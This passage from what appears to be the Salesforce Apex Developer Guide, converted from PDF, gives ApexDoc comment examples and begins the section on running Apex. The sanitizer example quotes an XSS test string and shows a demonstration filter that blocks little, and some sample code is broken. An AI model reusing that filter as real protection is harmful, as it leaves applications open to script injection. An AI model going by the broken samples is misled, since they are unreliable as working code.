-     * @throws DeprecatedMethodCalledException If this method is invoked,
-
-     * informing the user to migrate to the newer, more robust `geocodeAddress` method.
-
-     * @deprecated in 0.2.0. Use {@link #geocodeAddress(
-
-     * String street,
-
-     * String city,
-
-     * String state,
-
-     * String postalCode,
-
-     * String country)} instead.
-
-     * @since 0.1.0
-
-     */
-
-     @Deprecated
-
-     global static Coordinates convertAddressToCoordinates(String fullAddress) {
-
-      throw new DeprecatedMethodCalledException(
-
-       'The method `GeolocationService.convertAddressToCoordinates(String fullAddress)` is
-
-    deprecated. ' +
-
-        'Please use `GeolocationService.geocodeAddress(String street, String city, String
-
-    state, String postalCode, String country)` ' +
-
-        'for all new and existing address-to-coordinate conversions to ensure better
-
-   accuracy and reliability.'
-
-      );
-
-     }
-
-     /**
-
-     * Geocodes a structured address into precise latitude and longitude coordinates
-
-     * using a robust external geocoding service.
-
-     * This method provides higher accuracy and better handling of diverse address formats.
-
-     * @param street The street address (e.g., "123 Main St").
-
-     * @param city The city (e.g., "Anytown").
-
-     * @param state The state or province abbreviation (e.g., "CA").
-
-     * @param postalCode The postal or ZIP code (e.g., "90210").
-
-```
-
-
-Apex Developer Guide Document Your Apex Code
-
-```
-     * @param country The country name or code (e.g., "USA").
-
-     * @return A Coordinates object containing the latitude and longitude.
-
-     * @throws GeocodingException If the address cannot be geocoded,
-
-     * if the external service is unavailable, or if required address
-
-     * components are missing.
-
-     * @example
-
-     * {@code
-
-     * try {
-
-     * GeolocationService.Coordinates coords = GeolocationService.geocodeAddress(
-
-     * '415 Mission St',
-
-     * 'San Francisco',
-
-     * 'CA',
-
-     * '94105',
-
-     * 'USA'
-
-     * );
-
-     * } catch (GeolocationService.GeocodingException e) {
-
-     * // handle failure
-
-     * }
-
-     * }
-
-     * @since 0.2.0
-
-     */
-
-     global static Coordinates geocodeAddress(
-
-      String street,
-
-      String city,
-
-      String state,
-
-      String postalCode,
-
-      String country
-
-     ) {
-
-      // Implement actual geocoding logic
-
-      return new Coordinates(0, 0);
-
-     }
-
-     /**
-
-     * Exception thrown when a deprecated method is called.
-
-     * This indicates that the caller should migrate to the recommended alternative.
-
-     */
-
-     global class DeprecatedMethodCalledException extends Exception {
-
-     }
-
-     /**
-
-     * Exception thrown when a geocoding operation fails.
-
-     * This provides specific context for issues during address-to-coordinate conversion.
-
-     */
-
-     global class GeocodingException extends Exception {
-
-     }
-
-   }
-
-```
-
-Test Class Example
-
-```
-   /**
-
-    * Specifications for the GeolocationService
-
-    * @author Jane Devington
-
-    * @version 0.2.0
-
-```
-
-
-Apex Developer Guide Document Your Apex Code
-
-```
-    * @see GeolocationService
-
-    * @since 0.1.0
-
-    */
-
-   @IsTest
-
-   private class GeolocationServiceTest {
-
-     /**
-
-     * Verifies that known addresses are correctly geocoded to their expected coordinates.
-
-     * @see GeolocationService#geocodeAddress(
-
-     * String street,
-
-     * String city,
-
-     * String state,
-
-     * String postalCode,
-
-     * String country)
-
-     */
-
-     @IsTest
-
-     private static void validAddressShouldReturnCorrectCoordinates() {
-
-      String street = '415 Mission Street';
-
-      String city = 'San Francisco';
-
-      String state = 'CA';
-
-      String postalCode = '94105';
-
-      String country = 'USA';
-
-      GeolocationService.Coordinates coords;
-
-      Test.startTest();
-
-      coords = GeolocationService.geocodeAddress(
-
-       street,
-
-       city,
-
-       state,
-
-       postalCode,
-
-       country
-
-      );
-
-      Test.stopTest();
-
-      Assert.isNotNull(
-
-       coords,
-
-       'Coordinates should not be null for a valid address.'
-
-      );
-
-      Assert.areEqual(
-
-       37.785834,
-
-       coords.latitude,
-
-       'Latitude should match for Salesforce tower.'
-
-      );
-
-      Assert.areEqual(
-
-       -122.406417,
-
-       coords.longitude,
-
-       'Longitude should match for Salesforce tower.'
-
-      );
-
-     }
-
-     /**
-
-     * Verifies that calling the geocodeAddress with missing required parameters
-
-     * throws a GeocodingException.
-
-     * @see GeolocationService#geocodeAddress(
-
-     * String street,
-
-```
-
-
-Apex Developer Guide Document Your Apex Code
-
-```
-     * String city,
-
-     * String state,
-
-     * String postalCode,
-
-     * String country)
-
-     * @see GeolocationService#GeocodingException
-
-     */
-
-     @IsTest
-
-     private static void missingRequiredParametersShouldThrowGeocodingException() {
-
-      String street = ''; // Missing
-
-      String city = 'San Francisco';
-
-      String state = 'CA';
-
-      String postalCode = 94105;
-
-      String country = 'USA';
-
-      Test.startTest();
-
-      Boolean caughtException = false;
-
-      try {
-
-       GeolocationService.geocodeAddress(
-
-        street,
-
-        city,
-
-        state,
-
-        postalCode,
-
-        country
-
-       );
-
-      } catch (GeolocationService.GeocodingException e) {
-
-       caughtException = true;
-
-       Assert.areEqual(
-
-        'Street, City, and Postal Code are required for geocoding.',
-
-        e.getMessage(),
-
-        'Exception message should indicate missing required fields.'
-
-       );
-
-      }
-
-      Test.stopTest();
-
-      Assert.isTrue(
-
-       caughtException,
-
-       'GeocodingException should have been thrown for missing street.'
-
-      );
-
-     }
-
-     /**
-
-     * Verifies that calling the deprecated method throws a
-
-     * DeprecatedMethodCalledException.
-
-     * @see GeolocationService#convertAddressToCoordinates(String address)
-
-     * @see GeolocationService#DeprecatedMethodCalledException
-
-     */
-
-     @IsTest
-
-     private static void deprecatedMethodCallShouldThrowDeprecatedMethodCalledException() {
-
-      String oldAddress = '123 Deprecated Lane';
-
-      Test.startTest();
-
-      Boolean caughtException = false;
-
-      try {
-
-       GeolocationService.convertAddressToCoordinates(
-
-```
-
-
-Apex Developer Guide Document Your Apex Code
-
-```
-        oldAddress
-
-       );
-
-      } catch (GeolocationService.DeprecatedMethodCalledException e) {
-
-       caughtException = true;
-
-       Assert.isTrue(
-
-        e.getMessage().contains('is deprecated'),
-
-        'Exception message should indicate deprecation.'
-
-       );
-
-       Assert.isTrue(
-
-        e.getMessage().contains('Please use'),
-
-        'Exception message should suggest new method.'
-
-       );
-
-      }
-
-      Test.stopTest();
-
-      Assert.isTrue(
-
-       caughtException,
-
-       'DeprecatedMethodCalledException should have been thrown.'
-
-      );
-
-     }
-
-   }
-
-```
-
-Interface Example
-
-```
-   /**
-
-    * Defines a contract for objects that can be serialized to a
-
-    * specific format. Implementations must provide logic for converting
-
-    * their state into a string representation.
-
-    * @author Jane Coder
-
-    * @since 0.2.0
-
-    */
-
-   public interface ISerializable {
-
-      /**
-
-      * Serializes the object's current state into a String.
-
-      * @return A String representation of the object.
-
-      * @throws SerializationException if the object cannot be serialized.
-
-      */
-
-      String serialize();
-
-      /**
-
-      * Gets the format name this serializer supports (e.g., "JSON", "XML").
-
-      * @return The name of the serialization format.
-
-      */
-
-      String getFormatName();
-
-   }
-
-```
-
-Enum Example
-
-```
-   /**
-
-    * Represents the possible status levels for a support case.
-
-    * Defines standard values for case progression in the customer portal.
-
-    * @author John Developer
-
-    * @since 0.1.5
-
-```
-
-
-Apex Developer Guide Document Your Apex Code
-
-```
-    */
-
-   public enum CaseStatus {
-
-     /* A newly opened case, not yet assigned. */
-
-     BRAND_NEW,
-
-     /* Case is actively being worked on. */
-
-     WORKING,
-
-     /* Case has been escalated to a higher tier. */
-
-     ESCALATED,
-
-     /* Case has been resolved and closed. */
-
-     CLOSED
-
-   }
-
-```
-
-Method Example (with params, return, throws)
-
-```
-   /**
-
-    * Calculates the total price for a list of products, applying a discount.
-
-    * @param productCodes A List of unique product codes to calculate the price for.
-
-    * Each code must correspond to an existing Product2 record.
-
-    * @param discountPercentage The discount percentage to apply (e.g., 10.5 for 10.5%).
-
-    * Must be between 0.0 and 100.0.
-
-    * @return The calculated total price as a Decimal after applying the discount.
-
-    * Returns 0.0 if productCodes is null or empty.
-
-    * @throws InvalidArgumentException if discountPercentage is out of range.
-
-    * @throws ProductNotFoundException if any productCode does not match an
-
-    * existing product.
-
-    */
-
-   public Decimal calculateTotalPrice(
-
-     List<String> productCodes,
-
-     Decimal discountPercentage
-
-   ) {
-
-      if (discountPercentage < 0.0 || discountPercentage > 100.0) {
-
-        throw new IllegalArgumentException(
-
-         'Discount percentage must be between 0.0 and 100.0.'
-
-        );
-
-      }
-
-      if (productCodes == null || productCodes.isEmpty()) {
-
-        return 0.0;
-
-      }
-
-      //... implementation logic to fetch prices and calculate total...
-
-      return 100.0;
-
-   }
-
-   /**
-
-    * Represents an exception thrown when a requested product cannot be found.
-
-    * This custom exception provides a clear indication that a product lookup failed,
-
-    * allowing calling code to handle the 'not found' scenario specifically.
-
-    * It is typically thrown by methods attempting to retrieve Product2 records.
-
-    * @example
-
-    * {@code
-
-    * List<Product2> products = [
-
-    * SELECT Id
-
-    * FROM Product2
-
-    * WHERE ProductCode = :productCode
-
-```
-
-
-Apex Developer Guide Document Your Apex Code
-
-```
-    * LIMIT 1
-
-    * ];
-
-    * if (products.isEmpty()) {
-
-    * throw new ProductNotFoundException(
-
-    * 'Product with code ' + productCode + ' not found.'
-
-    * );
-
-    * }
-
-    * }
-
-    */
-
-   public class ProductNotFoundException extends Exception {}
-
-```
-
-Annotated Method (@AuraEnabled) Example
-
-```
-   public class OpportunityService {
-
-      /**
-
-      * Retrieves a list of open opportunities for a given account,
-
-      * accessible from Lightning Web Components. If the set of open opportunities
-
-      * can change during interaction with the component, the author will
-
-      * need to use {@code refreshApex()}.
-
-      * @param accountId The ID of the Account to retrieve opportunities for.
-
-      * @return A List of open Opportunity records. Returns an empty list if no
-
-      * open opportunities are found or if accountId is invalid.
-
-      * @see OpportunitySelector
-
-      */
-
-      @AuraEnabled(cacheable=true)
-
-      public static List<Opportunity> getOpenOpportunities(Id accountId) {
-
-        List<Opportunity> result = new List<Opportunity>();
-
-        //... implementation details...
-
-        return result;
-
-      }
-
-   }
-
-```
-
-External Reference Example
-
-```
-   /**
-
-    * Provides a service to retrieve current weather conditions from an external API.
-
-    * It utilizes Salesforce Named Credentials for secure endpoint and
-
-    * authentication management.
-
-    * @author John Doe
-
-    * @since 1.0.3
-
-    */
-
-   public with sharing class WeatherService {
-
-     /**
-
-     * Retrieves the current weather conditions for a specified city and country.
-
-     * This method makes an HTTP GET callout to an external weather API using a
-
-     * Named Credential.
-
-     * @param city The name of the city (e.g., "London").
-
-     * @param country The name or code of the country (e.g., "UK" or "United Kingdom").
-
-     * @return A JSON string representing the current weather conditions.
-
-     * @throws WeatherServiceException If the HTTP callout fails, returns a non-200 status,
-
-     * or if there's an issue parsing the response.
-
-     * @see <a href="https://example.com/weather-api-docs/current-conditions.html">External
-
-```
-
-
-Apex Developer Guide Document Your Apex Code
-
-```
-     * Weather API</a>
-
-     */
-
-     public static String getCurrentWeather(
-
-      String city,
-
-      String country
-
-     ) {
-
-      if (String.isBlank(city) || String.isBlank(country)) {
-
-       throw new WeatherServiceException(
-
-        'City and country cannot be blank for weather lookup.'
-
-       );
-
-      }
-
-      String namedCredentialUrl = 'callout:WeatherAPI/current';
-
-      String requestParams =
-
-       '?city=' +
-
-       EncodingUtil.urlEncode(city, 'UTF-8') +
-
-       '&country=' +
-
-       EncodingUtil.urlEncode(country, 'UTF-8');
-
-      HttpRequest req = new HttpRequest();
-
-      req.setEndpoint(namedCredentialUrl + requestParams);
-
-      req.setMethod('GET');
-
-      req.setTimeout(60000);
-
-      Http http = new Http();
-
-      HttpResponse res;
-
-      try {
-
-       res = http.send(req);
-
-      } catch (System.CalloutException e) {
-
-       throw new WeatherServiceException(
-
-        'HTTP Callout Failed: ' + e.getMessage()
-
-       );
-
-      }
-
-      if (res.getStatusCode() == 200) {
-
-       return res.getBody();
-
-      } else {
-
-       throw new WeatherServiceException(
-
-        'Failed to retrieve weather data. Status: ' +
-
-         res.getStatusCode() +
-
-         '. Details: ' +
-
-         res.getBody()
-
-       );
-
-      }
-
-     }
-
-     /**
-
-     * Custom exception for errors during weather data retrieval.
-
-     */
-
-     public class WeatherServiceException extends Exception {
-
-     }
-
-   }
-
-```
-
-
-## Apex Developer Guide Running Apex
-
-Inline Tags Example
-
-```
-   /**
-
-    * Sanitizes a given input string by removing or replacing certain
-
-    * characters such as {@code <script>}
-
-    * @param inputString The raw string provided by a user or external source.
-
-    * This string might contain malicious or unexpected characters,
-
-    * like a {@literal <script>} tag or a backslash {@literal \}.
-
-    * @return The sanitized string after processing.
-
-    * @example
-
-    * {@code
-
-    * String badInput = 'Hello, <script>alert(\'xss\')</script> World!';
-
-    * String safeOutput = SecurityUtils.sanitizeInput(badInput);
-
-    * System.debug('Sanitized Output: ' + safeOutput);
-
-    * } * @see {@link String#escapeHtml4} for a similar built-in method.
-
-    * {@hidden NOTE TO MAINTAINERS: This method should be updated if
-
-    * new security threats are identified. The current regex
-
-    * is designed to handle common XSS patterns but may not
-
-    * be exhaustive. The last major update was in v2.1.}
-
-    * @since 2.0
-
-    */
-
-   global static String sanitizeInput(String inputString) {
-
-     // simple example for demonstration purposes
-
-     String sanitized = inputString;
-
-     sanitized = sanitized.replace('<script>', '').replace('</script>', '');
-
-     sanitized = sanitized.replace('&#40;','(').replace('&#41;',')');
-
-     return sanitized;
-
-   }
-
-```
-
-SEE ALSO:
-
-ApexDoc Comment Structure and Tags
-
-Document Apex Constructs and Features
-
-## Running Apex
-
-You can access many features of the Salesforce user interface programmatically in Apex, and you can integrate with external SOAP and
-REST Web services. You can run Apex code using a variety of mechanisms. Apex code runs in atomic transactions.
-
-Invoking Apex
-You can run Apex code with triggers, or asynchronously, or as SOAP or REST web services.
-
-Apex Transactions and Governor Limits
-Apex Transactions ensure the integrity of data. Apex code runs as part of atomic transactions. Governor execution limits ensure the
-efficient use of resources on the Lightning Platform multitenant platform.
-
-Using Salesforce Features with Apex
-Many features of the Salesforce user interface are exposed in Apex so that you can access them programmatically in the Lightning
-Platform. For example, you can write Apex code to post to a Chatter feed, or use the approval methods to submit and approve
-process requests.
-
-
-### Apex Developer Guide Invoking Apex
-
-Integration and Apex Utilities
-Apex allows you to integrate with external SOAP and REST Web services using callouts. You can use utilities for JSON, XML, data
-security, and encoding. A general-purpose utility for regular expressions with text strings is also provided.
-
-### Invoking Apex
-
-You can run Apex code with triggers, or asynchronously, or as SOAP or REST web services.
-
-#### 1. Anonymous Blocks
-
-An anonymous block is Apex code that doesn’t get stored in the metadata, but that can be compiled and executed.
-
-2. Triggers
-Apex can be invoked by using _triggers_ . Apex triggers enable you to perform custom actions before or after changes to Salesforce
-records, such as insertions, updates, or deletions.
-
-3. Asynchronous Apex
-Apex offers multiple ways for running your Apex code asynchronously. Choose the asynchronous Apex feature that best suits your
-needs.
-
-4. Exposing Apex Methods as SOAP Web Services
-You can expose your Apex methods as SOAP web services so that external applications can access your code and your application.
-
-5. Exposing Apex Classes as REST Web Services
-You can expose your Apex classes and methods so that external applications can access your code and your application through
-the REST architecture.
-
-6. Apex Email Service
-You can use email services to process the contents, headers, and attachments of inbound email. For example, you can create an
-email service that automatically creates contact records based on contact information in messages.
-
-7. Using the InboundEmail Object
-For every email the Apex email service domain receives, Salesforce creates a separate InboundEmail object that contains the contents
-and attachments of that email. You can use Apex classes that implement the `Messaging.InboundEmailHandler` interface
-to handle an inbound email message. Using the `handleInboundEmail` method in that class, you can access an InboundEmail
-object to retrieve the contents, headers, and attachments of inbound email messages, as well as perform many functions.
-
-8. Visualforce Classes
-In addition to giving developers the ability to add business logic to Salesforce system events such as button clicks and related record
-updates, Apex can also be used to provide custom logic for Visualforce pages through custom Visualforce controllers and controller
-extensions.
-
-9. JavaScript Remoting
-Use JavaScript remoting in Visualforce to call methods in Apex controllers from JavaScript. Create pages with complex, dynamic
-behavior that isn’t possible with the standard Visualforce AJAX components.
-
-10. Apex in AJAX
-
-The AJAX toolkit includes built-in support for invoking Apex through anonymous blocks or public `webservice` methods.
-
-#### Anonymous Blocks
-
-An anonymous block is Apex code that doesn’t get stored in the metadata, but that can be compiled and executed.
-
-
-Apex Developer Guide Invoking Apex
-
-**User Permissions Needed**
-
-To execute anonymous Apex: “API Enabled” and “Author Apex”
-
-(Anonymous Apex execution through the API allows restricted access without the “Author
-Apex” permission.)
-
-If an anonymous Apex callout references a named credential as the endpoint: Customize Application
-
-Compile and execute anonymous blocks using one of the following:
-
-**•** Developer Console
-
-**•** Salesforce extensions for Visual Studio Code
-
-**•** The `executeAnonymous()` SOAP API call:
-
-```
-     ExecuteAnonymousResult executeAnonymous(String code)
-
-```
-
-You can use anonymous blocks to quickly evaluate Apex in the Developer Console or using the Salesforce Extensions for Visual Studio
-Code and Code Builder.
-
-Important: Every time you run an anonymous block, the code and its references are compiled. For repetitive calls, we strongly
-recommend you use compiled classes, such as Apex REST endpoints.
-
-Note the following about the content of an anonymous block (for `executeAnonymous()`, the `code` String):
-
-**•** Can include user-defined methods and exceptions.
-
-**•** User-defined methods can’t include the keyword `static` .
-
-**•** You don’t have to manually commit any database changes.
-
-**•** If an Apex trigger within an anonymous block completes successfully, the changes are committed to the database only after all
-operations in the block finish executing and don’t cause any errors. If your Apex trigger doesn’t complete successfully, any changes
-made to the database in the anonymous block are rolled back.
-
-**•** Unlike classes and triggers, anonymous blocks execute as the current user and can fail to compile if the code violates the user's
-object- and field-level permissions.
-
-**•** Don’t have a scope other than local. For example, although it’s legal to use the `global` access modifier, it has no meaning. The
-scope of the method is limited to the anonymous block.
-
-**•** When you define a class or interface (a custom type) in an anonymous block, it’s considered virtual by default when the anonymous
-block executes. This fact is true even if your custom type wasn’t defined with the `virtual` modifier. To avoid this from happening,
-save your class or interface in Salesforce. (Classes and interfaces defined in an anonymous block aren’t saved in your org.)
-
-Even though a user-defined method can refer to itself or later methods without the need for forward declarations, variables can’t be
-referenced before their actual declaration. In the following example, the Integer `int` must be declared while `myProcedure1`
-doesn’t:
-
-```
-   Integer int1 = 0;
-
-   void myProcedure1() {
-
-      myProcedure2();
-
-   }
-
-   void myProcedure2() {
-
-      int1++;
-
-   }
-
-```
-
-
-Apex Developer Guide Invoking Apex
-
-```
-   myProcedure1();
-
-```
-
-The returned result for anonymous blocks includes:
-
-**•** Status information for the compile and execute phases of the call, including any errors that occur
-
-**•** The debug log content, including the output of any calls to the `System.debug` method (see Debug Log on page 672)
-
-**•** The Apex stack trace of any uncaught code execution exceptions, including the class, method, and line number for each call stack
-element
-
-For more information, see `[executeAnonymous()](https://developer.salesforce.com/docs/atlas.en-us.260.0.api.meta/api/sforce_api_calls_executeanonymous.htm)` [, Working with Logs in the Developer Console, and Salesforce extensions for Visual](https://developer.salesforce.com/tools/vscode)
-[Studio Code and Code Builder.](https://developer.salesforce.com/tools/vscode)
-
-Executing Anonymous Apex through the API and the Author Apex Permission
-
-To run any Apex code with the `executeAnonymous()` API call, including Apex methods saved in the org, users must have the
-Author Apex permission. For users who don’t have the Author Apex permission, the API allows restricted execution of anonymous Apex.
-This exception applies only when users execute anonymous Apex through the API, or through a tool that uses the API, but not in the
-Developer Console. Such users are allowed to run the following in an anonymous block.
-
-**•** Code that they write in the anonymous block
-
-**•** Web service methods (methods declared with the `webservice` keyword) that are saved in the org
-
-**•** Any built-in Apex methods that are part of the Apex language
-
-Running any other Apex code isn’t allowed when the user doesn’t have the Author Apex permission. For example, calling methods of
-custom Apex classes that are saved in the org isn’t allowed nor is using custom classes as arguments to built-in methods.
-
-When users without the Author Apex permission run DML statements in an anonymous block, triggers can get fired as a result.
-
-SEE ALSO:
-
-Named Credentials as Callout Endpoints
-
-#### Triggers
-
-Apex can be invoked by using _triggers_ . Apex triggers enable you to perform custom actions before or after changes to Salesforce records,
-such as insertions, updates, or deletions.
-
-A trigger is Apex code that executes:
-
-**•** Before or after an insert operation
-
-**•** Before or after an update operation
-
-**•** Before or after a delete operation
-
-**•** Before or after a merge operation
-
-**•** Before or after an upsert operation
-
-**•** After an undelete operation
-
-An Apex trigger can also execute after the undelete operation.
-
-For example, you can have a trigger run before an object's records are inserted into the database, after records have been deleted, or
-even after a record is restored from the Recycle Bin.
-
-
-Apex Developer Guide Invoking Apex
-
-You can define triggers for top-level standard objects that support triggers, such as a Contact or an Account, some standard child objects,
-such as a CaseComment, and custom objects. To define a trigger, from the object management settings for the object whose triggers
-you want to access, go to Triggers.
 
